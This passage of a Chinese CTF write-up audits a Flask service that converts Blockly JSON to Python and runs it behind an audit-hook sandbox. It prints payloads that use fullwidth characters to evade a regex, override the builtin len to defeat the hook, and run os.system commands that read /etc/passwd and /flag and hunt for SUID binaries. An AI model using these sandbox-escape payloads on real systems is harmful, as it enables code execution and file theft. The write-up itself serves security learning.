class=\"built_in\">type</span>(blockly_data))</span><br><span class=\"line\">    blockly_data = json.loads(blockly_data.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(blockly_data)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        python_code = json_to_python(blockly_data)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> do(python_code)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> jsonify(&#123;<span class=\"string\">&quot;error&quot;</span>: <span class=\"string\">&quot;Error generating Python code&quot;</span>, <span class=\"string\">&quot;details&quot;</span>: <span class=\"built_in\">str</span>(e)&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t一点小疑问，这个代码有啥用，为啥没执行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">module_exists</span>(<span class=\"params\">module_name</span>):</span><br><span class=\"line\">    spec = importlib.util.find_spec(module_name)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> spec <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> module_name <span class=\"keyword\">in</span> sys.builtin_module_names:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> spec.origin:</span><br><span class=\"line\">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> spec.origin.startswith(std_lib_path) <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>​\t\t这段代码定义了一个函数  <code>module_exists</code> ，用于检查一个指定的模块是否存在。这个函数通过几个步骤来判断模块是否存在，并且区分了内置模块、标准库模块和第三方或本地模块。下面是对这段代码的逐行解释：</p>\n<ol>\n<li>\n<pre><code> def module_exists(module_name):\n</code></pre>\n</li>\n</ol>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">  - 这行定义了一个名为 `module_exists` 的函数，它接受一个参数 `module_name`，即要检查的模块名。</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;2. ```</span><br><span class=\"line\">  spec = importlib.util.find_spec(module_name)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>使用  <code>importlib.util.find_spec</code>  函数尝试找到名为  <code>module_name</code>  的模块的规格（spec）。这个函数返回一个模块规格对象，如果模块不存在，则返回  <code>None</code> 。</li>\n</ul>\n<ol start=\"3\">\n<li>\n<pre><code> if spec is None:\n</code></pre>\n</li>\n</ol>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">  - 这行检查 `find_spec` 返回的 `spec` 是否为 `None`。如果是，说明没有找到模块，执行下一行代码。</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;4. ```</span><br><span class=\"line\">  return False</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果模块不存在（ <code>spec</code>  为  <code>None</code> ），函数返回  <code>False</code> 。</li>\n</ul>\n<ol start=\"5\">\n<li>\n<pre><code> if module_name in sys.builtin_module_names:\n</code></pre>\n</li>\n</ol>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">  - 这行检查 `module_name` 是否在 `sys.builtin_module_names` 列表中。`sys.builtin_module_names` 包含了所有内置模块的名称。如果 `module_name` 是内置模块，执行下一行代码。</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;6. ```</span><br><span class=\"line\">  return True</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果  <code>module_name</code>  是内置模块，函数返回  <code>True</code> 。</li>\n</ul>\n<ol start=\"7\">\n<li>\n<pre><code> if spec.origin:\n</code></pre>\n</li>\n</ol>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">  - 这行检查 `spec` 对象的 `origin` 属性是否存在。`origin` 属性通常包含了模块的来源路径。如果 `origin` 存在，执行下一行代码。</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;8. ```</span><br><span class=\"line\">  std_lib_path = os.path.dirname(os.__file__)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>这行获取 Python 标准库的路径。 <code>os.__file__</code>  是  <code>os</code>  模块的路径， <code>os.path.dirname</code>  获取这个路径的目录部分，即标准库的根目录。</li>\n</ul>\n<ol start=\"9\">\n<li>\n<pre><code> if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):\n</code></pre>\n</li>\n</ol>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">  - 这行检查 `spec.origin` 是否以标准库路径 `std_lib_path` 开头，并且不以当前工作目录 `os.getcwd()` 开头。这是为了确保模块是标准库的一部分，而不是当前工作目录下的模块。如果这两个条件都满足，执行下一行代码。</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;10. ```</span><br><span class=\"line\">   return True</span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果模块是标准库的一部分，函数返回  <code>True</code> 。</li>\n</ul>\n<ol start=\"11\">\n<li>\n<pre><code>  return False\n</code></pre>\n</li>\n</ol>\n   <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">   - 如果模块既不是内置模块，也不是标准库模块，函数返回 `False`。</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;总结：这个函数通过检查模块的规格（spec），判断模块是否存在，并进一步区分模块是内置模块、标准库模块还是其他类型的模块。如果模块存在且是内置模块或标准库模块，函数返回 `True`；否则返回 `False`。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">​\t\t问题也就出现在这里，前后我没发现有调用过这个函数，先无所谓，看看审其他的。</span><br><span class=\"line\"></span><br><span class=\"line\">​\t\t`blockly_json`函数开始，先读取参数，之后转UTF-8之后拿给json_to_python去转为python代码：</span><br><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\">   python_code = &quot;&quot;</span><br><span class=\"line\">   python_code += block_to_python(block) + &quot;\\n&quot;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>​\t\t继续审 block_to_python，这里很明显可以看出，从 type 里取值，如果是 print，max，min，next 就递归继续后面的代码或者参数，直到没有相应参数为止，之后就返回 code 了，当遇到 text 的话，就将所有的字符串进行正则比较，遇到符号就清空 code 参数，否则 code 加上去然后返回。之后就是 do 了，获得源码，然后执行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">do</span>(<span class=\"params\">source_code</span>):</span><br><span class=\"line\">    hook_code = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">def my_audit_hook(event_name, arg):</span></span><br><span class=\"line\"><span class=\"string\">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    if len(event_name) &gt; 4:</span></span><br><span class=\"line\"><span class=\"string\">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class=\"line\"><span class=\"string\">    for bad in blacklist:</span></span><br><span class=\"line\"><span class=\"string\">        if bad in event_name:</span></span><br><span class=\"line\"><span class=\"string\">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(source_code)</span><br><span class=\"line\">    code = hook_code + source_code</span><br><span class=\"line\">    tree = <span class=\"built_in\">compile</span>(source_code, <span class=\"string\">&quot;run.py&quot;</span>, <span class=\"string\">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> verify_secure(tree):</span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;run.py&quot;</span>, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">                f.write(code)</span><br><span class=\"line\">            result = subprocess.run([<span class=\"string\">&#x27;python&#x27;</span>, <span class=\"string\">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class=\"number\">5</span>).stdout.decode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">            os.remove(<span class=\"string\">&#x27;run.py&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        os.remove(<span class=\"string\">&#x27;run.py&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Timeout!&quot;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t这个情况感觉很像是沙箱了，不允许执行某些特定的函数，</p>\n<p>这段代码定义了一个名为  <code>my_audit_hook</code>  的函数，并将其设置为 Python 解释器的审计钩子（audit hook）。审计钩子是一种机制，允许开发者在 Python 执行特定事件时插入自定义的检查或行为。这个功能在 Python 3.8 中被引入，主要用于安全目的，比如监控和限制某些潜在危险的操作。</p>\n<blockquote>\n<p>让我们逐步解析这段代码：</p>\n<ol>\n<li>\n<p>函数定义</p>\n<p>：</p>\n<ul>\n<li><code>def my_audit_hook(event_name, arg):</code> ：定义了一个名为  <code>my_audit_hook</code>  的函数，它接受两个参数： <code>event_name</code>  和  <code>arg</code> 。 <code>event_name</code>  是一个字符串，表示触发审计的事件名称； <code>arg</code>  是与该事件相关的附加信息，其类型和结构取决于具体的事件。</li>\n</ul>\n</li>\n<li>\n<p>黑名单</p>\n<p>：</p>\n<ul>\n<li><code>blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</code> ：定义了一个名为  <code>blacklist</code>  的列表，包含了一系列不希望被执行的函数或操作的名称。这些操作通常因为安全性原因而被认为是高风险的。</li>\n</ul>\n</li>\n<li>\n<p>事件名称长度检查</p>\n<p>：</p>\n<ul>\n<li><code>if len(event_name) &gt; 4: raise RuntimeError(&quot;Too Long!&quot;)</code> ：这行代码检查  <code>event_name</code>  的长度是否超过 4 个字符。如果是，则抛出  <code>RuntimeError</code>  异常，异常信息为 “Too Long!”。这个检查看起来是随意设置的，因为事件名称的长度通常与安全性无直接关联。</li>\n</ul>\n</li>\n<li>\n<p>黑名单检查</p>\n<p>：</p>\n<ul>\n<li>循环遍历  <code>blacklist</code>  列表，检查  <code>event_name</code>  中是否包含列表中的任何字符串。如果包含，则抛出  <code>RuntimeError</code>  异常，异常信息为 “No!”。这个检查旨在阻止执行黑名单中列出的高风险操作。</li>\n</ul>\n</li>\n<li>\n<p>设置审计钩子</p>\n<p>：</p>\n<ul>\n<li><code>__import__('sys').addaudithook(my_audit_hook)</code> ：这行代码首先动态导入  <code>sys</code>  模块（尽管通常直接导入  <code>sys</code>  模块更为常见），然后调用  <code>sys.addaudithook</code>  方法，将  <code>my_audit_hook</code>  函数设置为审计钩子。这意味着每当 Python 解释器执行一个审计事件时， <code>my_audit_hook</code>  函数都会被调用。</li>\n</ul>\n</li>\n</ol>\n<p><strong>注意</strong>：</p>\n<ul>\n<li>审计钩子是一个强大的特性，应该谨慎使用。不当的审计钩子设置可能会阻止合法的操作，导致程序无法正常运行。</li>\n<li>在实际生产环境中，对审计钩子的使用应该基于详细的安全分析和风险评估。</li>\n</ul>\n<p>- 此代码示例中的长度检查和黑名单可能需要根据实际的安全需求进行调整。</p>\n</blockquote>\n<p>​\t\t看上去像是一个沙箱，将代码写入文件，然后运行，捕获输出，需要逃逸：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTI2NDc/dGltZV9fMTMxMT1HcUd4dURSaVlpd3hscnpHN0R5R0RjR3Zmb1k1UW1vM3gjdG9jLTM0\">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGDcGvfoY5Qmo3x#toc-34</span> 绕过 audit hook</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">do</span>(<span class=\"params\">source_code</span>):  </span><br><span class=\"line\">    <span class=\"comment\"># 定义了一个名为do的函数，它接受一个参数source_code，这个参数预期是一个包含Python源代码的字符串。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">    hook_code = <span class=\"string\">&#x27;&#x27;&#x27;  </span></span><br><span class=\"line\"><span class=\"string\">def my_audit_hook(event_name, arg):  </span></span><br><span class=\"line\"><span class=\"string\">    # 定义了一个审计钩子函数my_audit_hook，它接受两个参数：event_name和arg。  </span></span><br><span class=\"line\"><span class=\"string\">    # 这个函数会在Python的审计事件发生时被调用。  </span></span><br><span class=\"line\"><span class=\"string\">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]  </span></span><br><span class=\"line\"><span class=\"string\">    # 定义了一个黑名单列表，包含了一些可能被认为是不安全的函数名。  </span></span><br><span class=\"line\"><span class=\"string\">    if len(event_name) &gt; 4:  </span></span><br><span class=\"line\"><span class=\"string\">        # 检查事件名称的长度是否超过4个字符。  </span></span><br><span class=\"line\"><span class=\"string\">        # 注意：这个检查可能并不直接与安全相关，它可能是一个示例或占位符。  </span></span><br><span class=\"line\"><span class=\"string\">        raise RuntimeError(&quot;Too Long!&quot;)  </span></span><br><span class=\"line\"><span class=\"string\">    # 如果事件名称太长，则抛出运行时错误。  </span></span><br><span class=\"line\"><span class=\"string\">    for bad in blacklist:  </span></span><br><span class=\"line\"><span class=\"string\">        # 遍历黑名单列表。  </span></span><br><span class=\"line\"><span class=\"string\">        if bad in event_name:  </span></span><br><span class=\"line\"><span class=\"string\">            # 检查事件名称是否包含黑名单中的任何字符串。  </span></span><br><span class=\"line\"><span class=\"string\">            raise RuntimeError(&quot;No!&quot;)  </span></span><br><span class=\"line\"><span class=\"string\">    # 如果事件名称包含黑名单中的字符串，则抛出运行时错误。  </span></span><br><span class=\"line\"><span class=\"string\">  </span></span><br><span class=\"line\"><span class=\"string\">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)  </span></span><br><span class=\"line\"><span class=\"string\"># 使用__import__函数动态导入sys模块，并调用其addaudithook方法注册审计钩子函数。  </span></span><br><span class=\"line\"><span class=\"string\">  </span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>  </span><br><span class=\"line\">    <span class=\"comment\"># 多行字符串结束，此时hook_code变量包含了上述审计钩子函数的定义和注册代码。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(source_code)  </span><br><span class=\"line\">    <span class=\"comment\"># 打印传入的源代码字符串，这在调试时可能有用，但在生产环境中可能泄露敏感信息。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">    code = hook_code + source_code  </span><br><span class=\"line\">    <span class=\"comment\"># 将审计钩子代码和传入的源代码拼接在一起，形成一个完整的Python脚本。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\"># 注意：下面这行代码实际上并没有在后续逻辑中使用tree变量。  </span></span><br><span class=\"line\">    tree = <span class=\"built_in\">compile</span>(source_code, <span class=\"string\">&quot;run.py&quot;</span>, <span class=\"string\">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)  </span><br><span class=\"line\">    <span class=\"comment\"># 使用compile函数尝试将源代码编译为字节码，但实际上由于指定了ast.PyCF_ONLY_AST标志，  </span></span><br><span class=\"line\">    <span class=\"comment\"># 这行代码会返回一个AST（抽象语法树）对象而不是字节码。然而，这个AST对象并没有被后续代码使用。  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:  </span><br><span class=\"line\">        <span class=\"comment\"># 尝试执行以下代码块。  </span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> verify_secure(tree):  </span><br><span class=\"line\">            <span class=\"comment\"># 调用一个名为verify_secure的函数，传入之前编译得到的AST对象（尽管这个对象并没有真正被使用）。  </span></span><br><span class=\"line\">            <span class=\"comment\"># 注意：verify_secure函数没有在代码中定义，因此这段代码在实际运行时会抛出NameError。  </span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;run.py&quot;</span>, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:  </span><br><span class=\"line\">                <span class=\"comment\"># 打开（或创建）一个名为run.py的文件，并准备写入内容。  </span></span><br><span class=\"line\">                f.write(code)  </span><br><span class=\"line\">            <span class=\"comment\"># 将之前拼接好的代码写入run.py文件。  </span></span><br><span class=\"line\">            result = subprocess.run([<span class=\"string\">&#x27;python&#x27;</span>, <span class=\"string\">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class=\"number\">5</span>).stdout.decode(<span class=\"string\">&quot;utf-8&quot;</span>)  </span><br><span class=\"line\">            <span class=\"comment\"># 使用subprocess模块运行run.py脚本，捕获其标准输出，并尝试将输出解码为UTF-8字符串。  </span></span><br><span class=\"line\">            <span class=\"comment\"># 这里还设置了一个5秒的超时时间。  </span></span><br><span class=\"line\">            os.remove(<span class=\"string\">&#x27;run.py&#x27;</span>)  </span><br><span class=\"line\">            <span class=\"comment\"># 删除run.py文件，清理执行环境。  </span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> result  </span><br><span class=\"line\">        <span class=\"comment\"># 如果verify_secure函数返回True（表示代码被认为是安全的），则执行上述代码块并返回执行结果。  </span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:  </span><br><span class=\"line\">            <span class=\"comment\"># 如果代码被认为是不安全的，则返回一条消息表示执行被中止。  </span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;Execution aborted due to security concerns.&quot;</span>  </span><br><span class=\"line\">    <span class=\"keyword\">except</span>:  </span><br><span class=\"line\">        <span class=\"comment\"># 捕获所有异常（这是一个不推荐的做法，因为它会捕获包括编程错误在内的所有异常）。  </span></span><br><span class=\"line\">        os.remove(<span class=\"string\">&#x27;run.py&#x27;</span>)  </span><br><span class=\"line\">        <span class=\"comment\"># 无论发生什么异常，都尝试删除run.py文件。  </span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Timeout!&quot;</span>  </span><br><span class=\"line\">    <span class=\"comment\"># 如果发生异常，则返回一条可能误导的消息（&quot;Timeout!&quot;），即使异常的原因可能并不是超时。</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t大概就这些了，先做个测试吧，半角形式似乎能绕过符号正则匹配：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;blocks&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;languageVersion&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">0</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;blocks&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">[</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;text&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;fields&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;TEXT&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;＇；ｐｒｉｎｔ（ｏｐｅｎ（＂／ｅｔｃ／ｐａｓｓｗｄ＂）．ｒｅａｄ（））＃&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">]</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t根据上面的绕过沙箱方式，这里可以让 len 永久性小于 1，就是重写内置函数 len，构造：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;;__import__(&#x27;</span>sys<span class=\"string\">&#x27;).modules[&#x27;</span>__main__<span class=\"string\">&#x27;].__dict__[&#x27;</span>__builtins__<span class=\"string\">&#x27;].__dict__[&#x27;</span><span class=\"built_in\">len</span><span class=\"string\">&#x27;] = lambda x: 1</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后就是读 flag 了：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZGQvJUVGJUJDJThDJUU5JTlDJTgwJUU4JUE2JTgxJUU3JTk0JUE4JUU1JTg4JUIwJUU4JUJGJTk5JUU0JUI4JUFBJUVGJUJDJThDJUU0JUI4JThEJUU4JUJGJTg3JUU0JUI4JThEJUU3JTlGJUE1JUU5JTgxJTkzJUU1JTg1JUI3JUU0JUJEJTkzJUU1JThFJTlGJUU3JTkwJTg2JUVGJUJDJThDJUU0JUJDJUIwJUU2JTkxJUI4JUU3JTlEJTgwJUU1JUJBJTk0JUU4JUFGJUE1JUU2JTk4JUFGJUU2JThGJTkwJUU2JTlEJTgzJUVGJUJDJThDJUU2JUFGJTk1JUU3JUFCJTlGJUU2JUIyJTk5JUU3JUFFJUIxJUU1JThGJUFGJUU4JTgzJUJEJUU2JUIyJUExJUU2JTlDJTg5JUU2JTlEJTgzJUU5JTk5JTkwJUVGJUJDJTg4JUU3JThDJTlDJUU3JTlBJTg0JUVGJUJDJThDJUU1JThGJUFGJUU4JTgzJUJEJUU0JUI4JThEJUU1JUFGJUI5JUVGJUJDJTg5JUUzJTgwJTgy\">https://gtfobins.github.io/gtfobins/dd/，需要用到这个，不过不知道具体原理，估摸着应该是提权，毕竟沙箱可能没有权限（猜的，可能不对）。</span></p>\n<p>​\t\tpayload：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;;__import__(&#x27;</span>sys<span class=\"string\">&#x27;).modules[&#x27;</span>__main__<span class=\"string\">&#x27;].__dict__[&#x27;</span>__builtins__<span class=\"string\">&#x27;].__dict__[&#x27;</span><span class=\"built_in\">len</span><span class=\"string\">&#x27;] = lambda x: 1</span></span><br><span class=\"line\"><span class=\"string\">print(len(&quot;aaaaaa&quot;))</span></span><br><span class=\"line\"><span class=\"string\">__import__(&#x27;</span>os<span class=\"string\">&#x27;).system(&#x27;</span>ls<span class=\"string\">&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">__import__(&#x27;</span>os<span class=\"string\">&#x27;).system(&#x27;</span>LFILE=file_to_read dd <span class=\"keyword\">if</span>=/flag<span class=\"string\">&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">__import__(&#x27;</span>os<span class=\"string\">&#x27;).system(&#x27;</span>find / -user root -perm -<span class=\"number\">4000</span> -<span class=\"built_in\">print</span> <span class=\"number\">2</span>&gt;/dev/null<span class=\"string\">&#x27;)#</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#改为半角，加上\\n：</span></span><br><span class=\"line\"><span 